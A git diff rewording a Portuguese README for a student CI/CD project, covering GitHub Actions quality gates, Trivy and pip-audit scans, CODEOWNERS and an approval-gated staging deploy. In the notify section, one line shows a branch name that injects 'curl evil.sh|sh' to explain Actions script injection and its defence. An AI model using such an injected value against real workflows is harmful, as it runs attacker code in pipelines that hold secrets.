@@ -18,13 +18,14 @@ objeto de estudo é o **pipeline**, não a aplicação.
 ![Trivy](https://img.shields.io/badge/Trivy-1904DA?style=flat-square&logo=aquasecurity&logoColor=white)
 ![Docker](https://img.shields.io/badge/Docker-2496ED?style=flat-square&logo=docker&logoColor=white)
 
-Badge verde = `main` saudável. Badge vermelho = `main` quebrada, e consertar vira
-prioridade sobre qualquer feature.
+Badge verde indica `main` saudável; vermelho indica `main` quebrada — e
+consertá-la passa a ter prioridade sobre qualquer funcionalidade nova.
 
 ---
 
 ## Sumário
 
+- [A entrega em um minuto](#a-entrega-em-um-minuto)
 - [Membros](#membros)
 - [O que o pipeline faz](#o-que-o-pipeline-faz)
 - [Início rápido](#início-rápido)
@@ -37,10 +38,24 @@ prioridade sobre qualquer feature.
 - [Arquivo por arquivo](#arquivo-por-arquivo)
 - [Variáveis, inputs e secrets](#variáveis-inputs-e-secrets)
 - [Verificação](#verificação)
-- [Troubleshooting](#troubleshooting)
+- [Solução de problemas](#solução-de-problemas)
 - [Decisões de arquitetura](#decisões-de-arquitetura)
 - [Divergências em relação ao enunciado](#divergências-em-relação-ao-enunciado)
 - [Créditos](#créditos)
+
+---
+
+## A entrega em um minuto
+
+- **O que bloqueia o merge:** lint, testes em três versões do Python e dois scans
+  de segurança, todos obrigatórios no ruleset da `main`.
+- **Como foi comprovado:** um PR com uma versão vulnerável do `requests` ficou
+  vermelho, teve o merge bloqueado e voltou ao verde com a correção — ver
+  [Evidências da entrega](#evidências-da-entrega).
+- **O que acompanha os gates:** alertas do Trivy anotados no próprio PR, cache de
+  dependências, notificação no Discord e deploy em staging com aprovação humana.
+- **Onde divergimos do enunciado, e por quê:** ver
+  [Divergências](#divergências-em-relação-ao-enunciado).
 
 ---
 
@@ -48,7 +63,7 @@ prioridade sobre qualquer feature.
 
 | Membro | GitHub | Frente principal |
 | --- | --- | --- |
-| Weynne Guimarães | [@weynne](https://github.com/weynne) | Repo Owner: setup do repositório, branch protection e pipeline de CI |
+| Weynne Guimarães | [@weynne](https://github.com/weynne) | Dono do repositório: configuração, branch protection e pipeline de CI |
 | Diego Tavares | [@diegotavares16](https://github.com/diegotavares16) | Environment e notificações; code owner dos workflows |
 | Jéssica Camarco | [@jessicacamarco](https://github.com/jessicacamarco) | Gates de segurança e documentação; code owner dos manifestos |
 
@@ -56,8 +71,8 @@ prioridade sobre qualquer feature.
 
 ## O que o pipeline faz
 
-O `ci.yml` é um conjunto de **quality gates** que bloqueiam o merge quando lint,
-testes ou scans de segurança falham.
+O `ci.yml` é um conjunto de **portões de qualidade** (*quality gates*) que
+bloqueiam o merge quando o lint, os testes ou os scans de segurança falham.
 
 ### O grafo de jobs
 
@@ -136,15 +151,15 @@ quando há o que reportar.
 
 ## Início rápido
 
-O caminho para ver o pipeline agindo, do jeito que ele age no dia a dia. Nada
-aqui precisa ser instalado na sua máquina: quem executa é o runner do GitHub.
+Como ver o pipeline em ação, do jeito que ele funciona no dia a dia. Nada aqui
+precisa ser instalado na sua máquina: quem executa é o runner do GitHub.
 
 ### 1. Abrir um pull request e ver o gate agir
 
 ```bash
 git checkout main && git pull
 git checkout -b feat/minha-mudanca
-# ... edita, commita ...
+# ... edite os arquivos e faça commit ...
 git push -u origin feat/minha-mudanca
 ```
 
@@ -155,8 +170,8 @@ aprova o PR.
 
 ### 2. Reproduzir a demonstração de shift-left
 
-O `requirements.txt` vem limpo. A falha é introduzida de propósito, para ver o
-gate reprovar antes do merge.
+O `requirements.txt` da `main` não tem vulnerabilidades conhecidas. A falha é
+introduzida de propósito, para ver o gate reprovar antes do merge.
 
 ```bash
 git checkout main && git pull
@@ -180,12 +195,12 @@ git commit -am "fix(deps): bump requests to 2.33.0 to clear the CVEs"
 git push
 ```
 
-Os três checks voltam ao verde e os alertas passam a *Fixed*; o merge passa a
-depender só da revisão de code owner. O problema foi pego no PR, antes do merge,
+Os três checks voltam ao verde e os alertas passam a aparecer como *Fixed*; o
+merge passa a depender só da revisão de um code owner. O problema foi pego no PR, antes do merge,
 sem ninguém rodar a aplicação.
 
 > [!IMPORTANT]
-> Subir só para `2.32.x` **não** zera os três CVEs. Os alertas do Trivy — e o
+> Subir só para `2.32.x` **não** corrige os três CVEs. Os alertas do Trivy — e o
 > `pip-audit`, rodado sobre o mesmo arquivo — apontam três versões de correção
 > diferentes: 2.32.0, 2.32.4 e 2.33.0. Nem sempre "atualizar um pouco" basta.
 
@@ -196,8 +211,8 @@ Logo após um merge na `main`, o job `Deploy to staging (dummy)` aparece como
 Quem aprova precisa ser um revisor do environment diferente de quem clicou em
 *Merge* — ver [Environment](#environment).
 
-O job não faz deploy de verdade: o que está sendo exercitado é o gate de
-aprovação humana, e a aprovação fica registrada no histórico de deployments do
+O job não faz deploy de verdade: o que se demonstra é o gate de aprovação
+humana, e cada aprovação fica registrada no histórico de deployments do
 repositório.
 
 ---
@@ -232,7 +247,7 @@ daí que sai o formato deste pipeline: `lint` e `test` em paralelo,
 `deploy-staging` com `needs: [lint, test]`, e `notify` com `needs:` nos três.
 
 Cada job roda numa VM nova, isolada, destruída ao fim. Nada persiste entre jobs
-além do que for explicitamente cacheado ou publicado como artefato — por isso o
+além do que for explicitamente armazenado em cache ou publicado como artefato — por isso o
 cache de pip existe, e por isso cada job precisa do seu próprio `checkout`.
 
 Usamos apenas **runners hospedados** pelo GitHub (`ubuntu-latest`). Runner
@@ -260,7 +275,8 @@ Nenhuma credencial de nuvem é necessária.
 
 ## Configuração no GitHub
 
-O que existe fora do código, e sem o que o pipeline vira decoração.
+O que é configurado fora do código — e sem o qual o pipeline roda, mas não
+bloqueia nada.
 
 ### Branch protection
 
@@ -268,7 +284,7 @@ O que existe fora do código, e sem o que o pipeline vira decoração.
 
 | Regra | Por quê |
 | --- | --- |
-| Require a pull request before merging, com 1 aprovação | Ninguém commita direto na `main` |
+| Require a pull request before merging, com 1 aprovação | Ninguém faz commit direto na `main` |
 | Dismiss stale pull request approvals | Um commit novo derruba a aprovação anterior |
 | Require review from Code Owners | Ativa o efeito do `CODEOWNERS` |
 | Merge method: somente *squash* | Um commit por PR na `main` |
@@ -277,7 +293,7 @@ O que existe fora do código, e sem o que o pipeline vira decoração.
 | Require linear history | Sem merge commits na `main` |
 | Block force pushes | Preserva o histórico |
 | Restrict deletions | A `main` não pode ser apagada |
-| Lista de bypass vazia | Vale para o owner também |
+| Lista de exceções (*bypass*) vazia | A regra vale também para o dono do repositório |
 
 ### Required status checks
 
@@ -288,7 +304,7 @@ O que existe fora do código, e sem o que o pipeline vira decoração.
 | `test (3.11) / Test (Python 3.11)` | Sim | idem |
 | `test (3.12) / Test (Python 3.12)` | Sim | idem |
 | `Deploy to staging (dummy)` | **Não** | Não roda em pull request |
-| `Notify pipeline result` | **Não** | É aviso, não gate |
+| `Notify pipeline result` | **Não** | É um aviso, não um gate |
 | `Code scanning results / Trivy` | **Não** | Ver abaixo |
 
 O nome dos três checks da matrix tem **duas partes**, separadas por barra: o job
@@ -307,8 +323,8 @@ O check `Code scanning results / Trivy` aparece sozinho, criado pelo upload do
 SARIF, e reporta os alertas novos no código alterado pelo pull request. Deixamos
 fora dos obrigatórios de propósito: ele mede **alertas novos no diff**, enquanto
 o gate real do Trivy é o `exit-code: 1` dentro do job, que mede
-**vulnerabilidade existente**. Torná-lo obrigatório colocaria duas semânticas
-diferentes no mesmo lugar e tiraria de nós o controle sobre o que bloqueia.
+**vulnerabilidade existente**. Torná-lo obrigatório misturaria dois critérios
+diferentes e nos tiraria o controle sobre o que bloqueia.
 
 ### Variables e secrets
 
@@ -318,17 +334,17 @@ diferentes no mesmo lugar e tiraria de nós o controle sobre o que bloqueia.
 | --- | --- | --- |
 | `PYTHON_VERSIONS` | **Variables** | `["3.10", "3.11", "3.12"]` |
 | `NOTIFY_WEBHOOK_URL` | **Secrets** | URL do webhook do Discord |
-| `STAGING_URL` | **Secrets** do environment `staging` | Valor dummy |
+| `STAGING_URL` | **Secrets** do environment `staging` | Valor fictício |
 
-Se `PYTHON_VERSIONS` não existir, o `ci.yml` cai no fallback e testa as mesmas
-três versões — o pipeline não quebra, só deixa de ser configurável sem commit.
+Se `PYTHON_VERSIONS` não existir, o `ci.yml` usa o valor de reserva e testa as
+mesmas três versões — o pipeline não quebra, só deixa de ser configurável sem commit.
 
 ### Environment
 
-`staging`, configurado com *required reviewers* e ***Prevent self-review*
-marcado**. O job `deploy-staging` reivindica esse environment e pausa até a
-aprovação. Secrets cadastrados dentro dele só existem para jobs que o
-reivindicam — é a diferença entre secret de repositório e secret com escopo de
+`staging`, configurado com *required reviewers* e com a opção **Prevent
+self-review** marcada. O job `deploy-staging` declara esse environment e pausa
+até a aprovação. Secrets cadastrados dentro dele só ficam disponíveis para jobs
+que o declaram — é a diferença entre secret de repositório e secret com escopo de
 ambiente.
 
 | Opção | Valor |
@@ -341,7 +357,7 @@ request. Como é o merge que dispara o push na `main`, na prática ele separa do
 papéis: quem clica em *Merge* não é quem clica em *Approve and deploy*.
 
 Isso não custa coordenação extra, porque o `CODEOWNERS` já obriga que o revisor
-de um PR seja outra pessoa. Quem revisa mergeia, e o autor aprova o deploy.
+de um PR seja outra pessoa. Quem revisa faz o merge, e o autor aprova o deploy.
 
 ### CODEOWNERS
 
@@ -351,10 +367,10 @@ de um PR seja outra pessoa. Quem revisa mergeia, e o autor aprova o deploy.
 /k8s/                   @weynne @jessicacamarco
 ```
 
-A última regra que casa é a que vale. Cada área tem um mantenedor ao lado do dono
+A última regra que corresponde ao caminho é a que vale. Cada área tem um mantenedor ao lado do dono
 do repositório, então a revisão cai em quem conhece aquela parte: pipeline com
 [@diegotavares16](https://github.com/diegotavares16), manifestos com
-[@jessicacamarco](https://github.com/jessicacamarco). O que não casa com nenhuma
+[@jessicacamarco](https://github.com/jessicacamarco). O que não corresponde a nenhuma
 regra específica o time revisa entre si, pela regra `*`.
 
 > [!NOTE]
@@ -384,14 +400,14 @@ pip-audit -r requirements.txt        # auditoria de dependências
 ```
 
 Se a sua máquina tiver uma versão de Python fora da matrix (3.10–3.12), o Docker
-roda no mesmo ambiente do CI:
+reproduz o ambiente do CI:
 
 ```bash
 docker run --rm -v "$PWD":/app -w /app python:3.12-slim bash -c \
   "pip install -q -r requirements-dev.txt && ruff check . && pytest -q && pip-audit -r requirements.txt"
 ```
 
-O scan do Trivy, com as mesmas flags do pipeline:
+O scan do Trivy, com as mesmas opções do pipeline:
 
 ```bash
 docker run --rm -v "$PWD":/src -w /src aquasec/trivy:0.58.0 fs \
@@ -467,8 +483,8 @@ alterou apenas estes arquivos:
 git mv .github/CODEOWNERS.example .github/CODEOWNERS
 ```
 
-Três regras, uma por linha. Cada uma casa um caminho e lista quem o GitHub deve
-pedir para revisar quando um PR toca aquele caminho.
+Três regras, uma por linha. Cada uma associa um caminho a quem o GitHub deve
+pedir revisão quando um PR altera aquele caminho.
 
 ```text
 *                       @weynne @diegotavares16 @jessicacamarco
@@ -478,20 +494,20 @@ pedir para revisar quando um PR toca aquele caminho.
 
 | Bloco | O que faz |
 | --- | --- |
-| `*` | Regra de fundo: qualquer arquivo que não case com as outras. O time inteiro revisa |
+| `*` | Regra de fundo: qualquer arquivo que não corresponda às outras. O time inteiro revisa |
 | `/.github/workflows/` | Mudança no pipeline. Revisão do dono do repositório ou do mantenedor do CI |
 | `/k8s/` | Manifestos de deploy. Dono do repositório ou a mantenedora dos manifestos |
 
-**A última regra que casa é a que vale**, não a primeira. Um PR que toca
-`ci.yml` cai na segunda regra e ignora a primeira. Isso é o contrário do
-`.gitignore` e é o erro mais comum de leitura do arquivo.
+**A última regra que corresponde é a que vale**, não a primeira. Um PR que altera
+o `ci.yml` cai na segunda regra e ignora a primeira. Quem lê o arquivo de cima
+para baixo costuma supor o contrário — é o erro de leitura mais comum.
 
 **Toda regra tem no mínimo dois donos.** O autor de um PR não pode aprovar o
 próprio PR: numa regra de dono único, todo PR aberto por ele ficaria sem revisor
 possível e o merge travaria para sempre.
 
 Para o arquivo ter efeito, duas condições: os usuários precisam ter acesso de
-**escrita** e ter **aceito** o convite de collaborator — convite pendente faz o
+**escrita** e ter **aceito** o convite de colaborador — convite pendente faz o
 GitHub exibir "Unknown owner" e ignorar a linha em silêncio. E o ruleset da
 `main` precisa de **Require review from Code Owners** marcado, senão o arquivo
 só sugere revisores sem obrigar ninguém.
@@ -509,11 +525,11 @@ permissões e orquestração, e delega os steps de teste ao reusable.
 
 | Bloco | O que faz |
 | --- | --- |
-| `name:` | Nome que aparece na aba Actions e na URL do badge |
+| `name:` | Nome que aparece na aba Actions e no texto do badge |
 | `on:` | Os três gatilhos que fazem o workflow rodar |
 | `permissions:` | Teto de privilégio do `GITHUB_TOKEN` para todo o workflow |
 | `concurrency:` | Cancela o run anterior da mesma branch |
-| `env:` | Valores reusados por mais de um lugar, não sensíveis |
+| `env:` | Valores de configuração não sensíveis |
 | `jobs.lint` | Gate de estilo com `ruff`, fora da matrix |
 | `jobs.test` | Chama o reusable uma vez por versão do Python |
 | `jobs.deploy-staging` | Gate de aprovação humana via environment |
@@ -531,7 +547,7 @@ on:
 ```
 
 Cada um existe por um motivo diferente. **`pull_request`** é o que faz o CI ser
-um gate de merge — sem ele o pipeline rodaria depois do estrago. **`push` na
+um gate de merge — sem ele, o pipeline só rodaria depois do merge. **`push` na
 `main`** mantém o badge do README honesto sobre a saúde da branch principal.
 **`tags: ['*']`** submete toda tag aos mesmos gates, porque uma tag é candidata a
 release e nenhuma release deveria existir sem ter passado por lint, testes e
@@ -544,9 +560,10 @@ permissions:
   contents: read
 ```
 
-Sem esse bloco o `GITHUB_TOKEN` vem com `contents: write` ou mais. Um workflow
-comprometido — por uma action de terceiro maliciosa, por exemplo — escreveria no
-repositório, criaria releases, apagaria coisas.
+Sem esse bloco, o `GITHUB_TOKEN` herda a permissão padrão do repositório, que
+pode incluir escrita. Um workflow comprometido — por uma action de terceiro
+maliciosa, por exemplo — poderia escrever no repositório, criar releases ou
+apagar branches.
 
 O bloco no topo é o **padrão** de todos os jobs. Um job que precisa de mais pede
 explicitamente, e só ele recebe: o `test` declara `security-events: write` porque
@@ -564,7 +581,7 @@ O `group` é a chave: runs com a mesma chave não coexistem. Como a chave inclui
 ref, dois PRs diferentes rodam em paralelo, mas dois pushes na mesma branch não —
 o novo cancela o antigo em vez de entrar na fila atrás dele.
 
-#### `env:` — o que não deve ficar hardcoded
+#### `env:` — o que não deve ficar fixo no código
 
 ```yaml
 env:
@@ -601,10 +618,10 @@ jobs da matrix.
       python-version: ${{ matrix.python-version }}
 ```
 
-Cinco coisas acontecendo em dez linhas:
+Cinco decisões em dez linhas:
 
 **`uses:` em vez de `steps:`.** Este job não tem `runs-on` nem `steps` — quem
-executa steps é o reusable. É a regra que mais pega: acrescentar `runs-on` aqui
+executa steps é o reusable. É o erro mais comum: acrescentar `runs-on` aqui
 quebra o workflow com erro de validação.
 
 **A matrix vive no chamador.** O `strategy.matrix` multiplica este job em três, e
@@ -614,12 +631,12 @@ steps, e mudar os steps não toca nas versões.
 **`fail-fast: false`.** O padrão do GitHub é `true`, que **cancela** as outras
 versões no instante em que uma falha. Com `false`, as três terminam — e uma
 execução responde se o problema é de uma versão só ou de todas, em vez de três
-ciclos de conserta-e-roda-de-novo.
+ciclos de corrigir e rodar de novo.
 
-**As versões vêm de uma variable.** `vars.PYTHON_VERSIONS` é configuração, não
+**As versões vêm de uma variável.** `vars.PYTHON_VERSIONS` é configuração, não
 código: ampliar a cobertura é uma edição em `Settings`, sem commit. O literal
-depois do `||` é fallback — sem ele, um clone sem a variable cadastrada quebraria
-no `fromJSON` de uma string vazia.
+depois do `||` é o valor de reserva — sem ele, um clone sem a variável cadastrada
+quebraria no `fromJSON` de uma string vazia.
 
 **`with:` é o contrato.** O valor da matrix entra no reusable pelo input
 `python-version`. É por isso que o mesmo dado tem dois nomes: `matrix.` aqui,
@@ -637,22 +654,22 @@ no `fromJSON` de uma string vazia.
       name: staging
 ```
 
-O step em si só dá `echo` — é deploy de mentira. O que está sendo exercitado é o
-bloco **`environment:`**: ao reivindicar um environment que tem *required
+O step apenas executa um `echo`: o deploy é simulado. O que se demonstra é o
+bloco **`environment:`**: ao declarar um environment que tem *required
 reviewers*, o job aparece como *Waiting* e pausa até alguém aprovar em **Review
 deployments**. Nenhuma linha de código nossa implementa a espera; a plataforma
 faz isso.
 
 **`needs: [lint, test]`** é o que cria ordem: sem isso ele rodaria em paralelo
-com os testes e "deployaria" código que ainda não passou. **O `if:`** restringe a
-push na `main` — pedir aprovação a cada pull request queimaria a paciência dos
-revisores em uma tarde.
+com os testes e faria deploy de código que ainda não passou por eles. **O `if:`**
+restringe o job a push na `main` — pedir aprovação a cada pull request cansaria
+os revisores rapidamente.
 
 > [!WARNING]
 > Este job **não** pode ser marcado como required status check. Ele não roda em
 > pull request, e um check que nunca reporta deixa o merge bloqueado para sempre.
 
-#### `jobs.notify` — dois steps, três armadilhas
+#### `jobs.notify` — dois steps e os cuidados de cada um
 
 O primeiro step decide a mensagem; o segundo envia.
 
@@ -673,7 +690,7 @@ expõe o caminho de um arquivo nessa variável, e o step anexa linhas
 `steps.msg.outputs.status` daqui para frente.
 
 **`skipped` conta como neutro.** `deploy-staging` fica `skipped` em pull request,
-porque o `if:` dele não casou. Tratar isso como falha faria todo PR reportar um
+porque a condição `if:` dele não é satisfeita. Tratar isso como falha faria todo PR reportar um
 pipeline vermelho.
 
 ```yaml
@@ -689,7 +706,7 @@ pipeline vermelho.
 
 **Todo valor entra por `env:`, e o shell lê como `$VAR`.** Escrever
 `${{ github.head_ref }}` direto dentro do `run:` colaria o valor no **texto do
-script** antes do shell existir — uma branch chamada `x";curl evil.sh|sh;"`
+script** antes de o shell executá-lo — uma branch chamada `x";curl evil.sh|sh;"`
 viraria código executável. É a injeção de script clássica do Actions. Por `env:`
 o valor é apenas dado.
 
@@ -704,10 +721,10 @@ o Discord recusa o payload: o job fica verde e a mensagem nunca chega. Com ele o
 step fica vermelho e o log mostra o motivo que o Discord devolveu.
 
 **`jq` monta o JSON**, em vez de concatenação de string: uma aspa ou um acento
-num nome de branch não conseguem produzir corpo malformado. O `jq` vem
+num nome de branch não geram um JSON malformado. O `jq` vem
 pré-instalado nos runners Ubuntu do GitHub.
 
-**O guard está no step, não no job.** O contexto `secrets` não está disponível em
+**A condição fica no step, não no job.** O contexto `secrets` não está disponível em
 `if:` de job — daí o `if: env.WEBHOOK_URL != ''` aqui. Sem ele, um clone deste
 repositório sem webhook configurado falharia num `curl` para uma URL vazia.
 
@@ -733,7 +750,7 @@ O prefixo `_` é convenção: sinaliza workflow de apoio, chamado por outro via
 | `permissions:` | Teto do token dentro deste workflow |
 | steps 1–4 | checkout → setup-python → cache → install |
 | step Trivy | Primeiro gate de segurança, antes dos testes |
-| step upload SARIF | Manda o relatório para a aba Security |
+| step upload SARIF | Envia o relatório para o code scanning |
 | steps pytest e pip-audit | Gate funcional e gate de dependências |
 
 #### `workflow_call` e o input
@@ -762,14 +779,14 @@ multiplica é o `ci.yml`.
 ```
 
 Três componentes na chave, cada um evitando um problema: **sistema do runner**
-porque wheel compilada para Linux não serve no macOS; **versão do Python** porque
+porque um pacote *wheel* compilado para Linux não serve no macOS; **versão do Python** porque
 `cp310` e `cp312` são incompatíveis; **hash dos requirements** porque mudar
 dependência tem que invalidar o cache.
 
 Chave igual à de um run anterior significa *cache hit* e nada é baixado. Chave
 diferente significa *miss*, mas o `restore-keys` casa por prefixo e recupera um
-cache próximo, aproveitando parte da instalação. Não é sobre economizar minuto de
-máquina: é sobre feedback rápido no PR.
+cache próximo, aproveitando parte da instalação. O objetivo não é economizar
+minutos de máquina, e sim dar retorno rápido no PR.
 
 #### O step do Trivy
 
@@ -786,12 +803,12 @@ máquina: é sobre feedback rápido no PR.
 
 | Campo | Efeito |
 | --- | --- |
-| `scan-type: fs` | Escaneia arquivos e manifestos, sem precisar buildar imagem |
+| `scan-type: fs` | Analisa arquivos e manifestos, sem precisar construir uma imagem |
 | `scan-ref: .` | A raiz do repositório |
 | `severity` | A faixa que reprova. Começa em `MEDIUM` — ver [Divergências](#divergências-em-relação-ao-enunciado) |
-| `exit-code: '1'` | **É isto que transforma o scan em gate.** Sem, ele só informa |
+| `exit-code: '1'` | **É isto que transforma o scan em gate.** Sem ele, o scan só informa |
 | `ignore-unfixed: true` | Descarta CVE sem patch, que manteria o build vermelho sem ação possível |
-| `format: sarif` | Formato que alimenta a aba Security → Code scanning |
+| `format: sarif` | Formato que alimenta o code scanning do GitHub |
 
 #### O upload do SARIF
 
@@ -806,7 +823,7 @@ máquina: é sobre feedback rápido no PR.
 
 Dois detalhes que não são preferência. **`if: always()`**: o step anterior sai com
 código 1 quando acha vulnerabilidade, e sem o `always()` este seria pulado —
-o relatório nunca chegaria à aba Security exatamente quando há o que reportar.
+o relatório nunca chegaria ao code scanning exatamente quando há o que reportar.
 **`category` por versão**: são três uploads do mesmo commit, um por job da
 matrix; sem categoria distinta eles se sobrescrevem, e uploads simultâneos podem
 colidir.
@@ -823,16 +840,16 @@ colidir.
 
 O `-r requirements.txt` mantém o gate focado nas dependências de **produção**.
 Sem ele, `pip-audit` audita o ambiente inteiro — e um CVE no `pytest` ou no
-`ruff` derrubaria o pipeline da aplicação sem nada a ver com o que vai para o
-cliente.
+`ruff` derrubaria o pipeline da aplicação sem ter relação com o que vai para
+produção.
 
 ---
 
 ### `README.md`
 
 O arquivo que veio no kit é do professor e explica como usar o template. Foi
-substituído inteiro pela documentação da entrega — este arquivo. É item
-explícito da rubrica, não enfeite.
+substituído inteiro pela documentação da entrega — este arquivo, que é um item
+explícito da rubrica.
 
 ---
 
@@ -840,7 +857,7 @@ explícito da rubrica, não enfeite.
 
 Único arquivo de código que o grupo toca, e apenas na
 [demonstração de shift-left](#2-reproduzir-a-demonstração-de-shift-left): a linha
-do `requests` é rebaixada para 2.31.0 para ver os gates reprovarem, e devolvida
+do `requests` é rebaixada para 2.31.0 para ver o gate reprovar, e devolvida
 para 2.33.0 na mesma branch. A aplicação em `app.py` não foi alterada em momento
 nenhum.
 
@@ -848,16 +865,16 @@ nenhum.
 
 ## Variáveis, inputs e secrets
 
-Nada de valor fixo espalhado pelo YAML. Cada tipo de dado entra por um mecanismo
+Nenhum valor fica fixo e espalhado pelo YAML. Cada tipo de dado entra por um mecanismo
 diferente, escolhido pelo escopo e pela sensibilidade.
 
 | Mecanismo | Onde é declarado | Usado para | Exemplo aqui |
 | --- | --- | --- | --- |
 | `env` de workflow | Topo do `ci.yml` | Valor repetido, não sensível | `DEFAULT_PYTHON_VERSION: '3.12'` |
-| `env` de step | Dentro do step | Expor um secret a um comando de shell | `WEBHOOK_URL`, `RUN_URL` |
+| `env` de step | Dentro do step | Passar valores ao shell com segurança, inclusive secrets | `WEBHOOK_URL`, `RUN_URL` |
 | `matrix` | `strategy` do job chamador | Dimensão que multiplica o job | `python-version` |
 | `inputs` | `workflow_call` do reusable | Contrato entre chamador e reusable | `python-version` |
-| Variable de repositório | `Settings → Secrets and variables → Variables` | Configuração não sensível que muda sem commit | `PYTHON_VERSIONS` |
+| Variável de repositório | `Settings → Secrets and variables → Variables` | Configuração não sensível que muda sem commit | `PYTHON_VERSIONS` |
 | Secret de repositório | `Settings → Secrets and variables → Secrets` | Credencial usada por qualquer job | `NOTIFY_WEBHOOK_URL` |
 | Secret de environment | Dentro do environment `staging` | Credencial que só um ambiente pode ler | `STAGING_URL` |
 
@@ -865,7 +882,7 @@ O `DEFAULT_PYTHON_VERSION` existe porque o job `lint` não precisa da matrix
 inteira. Sem a variável, a versão ficaria escrita direto no step, e trocar de
 3.12 para 3.13 exigiria caçar ocorrências pelo arquivo.
 
-As versões testadas saem de uma **variable de repositório**, não de uma lista
+As versões testadas saem de uma **variável de repositório**, não de uma lista
 fixa no YAML:
 
 ```yaml
@@ -874,9 +891,9 @@ matrix:
 ```
 
 Assim ampliar ou reduzir a cobertura é uma edição em `Settings`, sem commit e sem
-novo PR. O literal depois do `||` é um **fallback**: sem ele, um clone deste
-repositório sem a variable cadastrada quebraria no `fromJSON` de uma string
-vazia. Variable e não secret porque a informação não é sensível — o valor
+novo PR. O literal depois do `||` é um **valor de reserva**: sem ele, um clone deste
+repositório sem a variável cadastrada quebraria no `fromJSON` de uma string
+vazia. Variável, e não secret, porque a informação não é sensível — o valor
 aparece no log do run de qualquer forma.
 
 O `python-version` aparece com dois nomes diferentes de propósito: é
@@ -885,9 +902,10 @@ reusable não sabe que existe uma matrix — ele recebe **uma** versão por cham
 Quem multiplica é o chamador.
 
 > [!CAUTION]
-> Webhook de Discord é um bearer token: quem tem a URL posta no canal. Nunca
-> comitar valor de secret, nem em comentário nem em arquivo de exemplo — um
-> segredo no histórico do Git continua lá depois de "apagado" do arquivo.
+> A URL de um webhook do Discord funciona como credencial: quem a tem consegue
+> publicar no canal. Nunca faça commit do valor de um secret, nem em comentário
+> nem em arquivo de exemplo — um segredo no histórico do Git continua lá depois
+> de "apagado" do arquivo.
 
 ---
 
@@ -898,7 +916,7 @@ Quem multiplica é o chamador.
 grep -n "uses: ./.github/workflows/_reusable-test.yml" .github/workflows/ci.yml
 
 # Nenhuma action presa a tag mutável — todas fixadas por SHA de commit:
-grep -hE 'uses: [a-z].*@v[0-9]' .github/workflows/*.yml || echo "todas pinadas"
+grep -hE 'uses: [a-z].*@v[0-9]' .github/workflows/*.yml || echo "todas fixadas por SHA"
 
 # A mesma varredura de segredos que o professor faz no histórico. As únicas
 # ocorrências esperadas são o próprio padrão, citado neste README, e o exemplo
@@ -911,11 +929,11 @@ Na interface do GitHub:
 - **Actions** — o run do último push na `main` com os quatro checks verdes
 - **Em um PR com dependência vulnerável** — alertas do Trivy anotados na linha alterada e botão de merge cinza
 - **Após um merge na `main`** — `Deploy to staging (dummy)` em *Waiting*, com **Review deployments**
-- **Discord** — card verde a cada run concluído e vermelho quando um gate reprova, com link para o run
+- **Discord** — card verde a cada run bem-sucedido e vermelho quando um gate reprova, com link para o run
 
 ---
 
-## Troubleshooting
+## Solução de problemas
 
 **O CI roda, fica vermelho, e o merge acontece mesmo assim.** Os required status
 checks não foram marcados no ruleset. Os checks só aparecem na lista depois de
@@ -923,10 +941,10 @@ rodarem pelo menos uma vez: abra um PR, deixe o CI rodar e volte para marcá-los
 
 **O merge está bloqueado por um check que não existe mais.** Os nomes dos checks
 mudam quando o pipeline é refatorado — introduzir a matrix ou extrair o reusable
-renomeia todos eles. Rode o CI uma vez para os novos nomes aparecerem e remarque.
+renomeia todos eles. Rode o CI uma vez para os novos nomes aparecerem e marque-os de novo.
 
 **`CODEOWNERS` com aviso "Unknown owner".** O usuário listado não tem acesso de
-escrita ao repositório, ou o convite de collaborator ainda não foi aceito. A regra
+escrita ao repositório, ou o convite de colaborador ainda não foi aceito. A regra
 é ignorada silenciosamente até isso ser resolvido.
 
 **Um PR não consegue ser aprovado por ninguém.** O autor não pode aprovar o
@@ -940,14 +958,14 @@ Corrigir depois exigiria force push, que o ruleset bloqueia; o que evita o
 problema é revisar o título ao abrir o PR.
 
 **O job `notify` fica verde mas nada chega no canal.** O secret
-`NOTIFY_WEBHOOK_URL` não está cadastrado, e o guard `if: env.WEBHOOK_URL != ''`
+`NOTIFY_WEBHOOK_URL` não está cadastrado, e a condição `if: env.WEBHOOK_URL != ''`
 pula o envio de propósito. Confira em `Settings → Secrets and variables → Actions`.
 
 **`upload-sarif` retorna 403.** Code scanning em repositório privado exige GitHub
 Advanced Security. Ver [Divergências](#divergências-em-relação-ao-enunciado).
 
-**`Cache save failed` numa perna da matrix.** Aviso, não erro. As três pernas
-terminam quase juntas e o GitHub recusa gravações concorrentes de cache. A
+**`Cache save failed` em um dos jobs da matrix.** É um aviso, não um erro. Os três
+jobs terminam quase juntos e o GitHub recusa gravações concorrentes de cache. A
 execução seguinte restaura pelo `restore-keys` e o build não é afetado.
 
 **O workflow não dispara.** Arquivos `.yml.example` são inertes: o GitHub Actions
@@ -960,7 +978,7 @@ só executa `.yml` e `.yaml` dentro de `.github/workflows/`.
 ### O que foi usado
 
 Tudo com versão fixada. As dependências Python vêm de `requirements-dev.txt`; as
-Actions estão pinadas por SHA de commit no YAML, com a tag em comentário.
+Actions estão fixadas por SHA de commit no YAML, com a tag em comentário.
 
 | Papel no pipeline | Ferramenta | Versão | Onde |
 | --- | --- | --- | --- |
@@ -977,7 +995,7 @@ Actions estão pinadas por SHA de commit no YAML, com a tag em comentário.
 | Notificação | webhook do Discord via `curl` | — | job `notify` |
 | Aprovação humana | environment do GitHub com *required reviewer* | — | job `deploy-staging` |
 
-Três mecanismos do GitHub Actions carregam o peso do desenho: **reusable
+Três mecanismos do GitHub Actions sustentam o desenho: **reusable
 workflow** (`workflow_call`) para não duplicar steps, **matrix** para multiplicar
 o job por versão do Python, e **environment** para introduzir aprovação humana
 sem escrever lógica nenhuma.
@@ -997,9 +1015,9 @@ mantenedor execução de código no pipeline, com acesso aos secrets. Cada `uses
 aponta para o commit imutável do release, com a tag em comentário para manter a
 linha legível.
 
-**Pinar não é congelar.** As versões dos esqueletos do starter-kit
+**Fixar a versão não é congelá-la.** As versões dos esqueletos do starter-kit
 (`checkout@v4.2.2`, `setup-python@v5.6.0`, `cache@v4.2.4`) rodam em **Node.js 20**,
-que o GitHub deprecou — cada execução reportava oito avisos dizendo que as actions
+que o GitHub descontinuou — cada execução reportava oito avisos dizendo que as actions
 estavam sendo forçadas para o Node.js 24, e o `upload-sarif` avisava que a CodeQL
 Action v3 sai em dezembro de 2026. Subimos as quatro para o release atual, cada
 uma no seu SHA. É a outra metade da prática: fixar o hash protege contra a tag
